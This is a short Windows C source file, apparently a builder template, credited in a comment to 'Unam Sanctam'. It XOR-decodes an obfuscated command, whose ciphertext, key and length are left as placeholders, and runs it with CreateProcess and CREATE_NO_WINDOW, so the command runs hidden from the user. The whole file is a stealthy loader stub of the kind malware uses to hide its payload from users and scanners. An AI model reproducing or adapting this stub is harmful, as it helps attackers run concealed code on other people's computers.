#include <windows.h>
#include <stdlib.h>

/* Created by Unam Sanctam, https://github.com/UnamSanctam */

char* cipher(char* data, char* key, int dataLen) {
	int keyLen = strlen(key);
	char* output = (char*)malloc(sizeof(char) * dataLen+1);
	output[dataLen] = 0;
	for (int i = 0; i < dataLen; ++i) {
		output[i] = data[i] ^ key[i % keyLen];
	}
	return output;
}

int main(int argc, char **argv) 
{
	PROCESS_INFORMATION p_info;
	STARTUPINFO s_info;

	memset(&s_info, 0, sizeof(s_info));
	memset(&p_info, 0, sizeof(p_info));
	s_info.cb = sizeof(s_info);

	if (CreateProcess(NULL, cipher(#COMMAND, "#KEY", #LENGTH), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info))
	{
		CloseHandle(p_info.hProcess);
		CloseHandle(p_info.hThread);
	}
	return 0;
}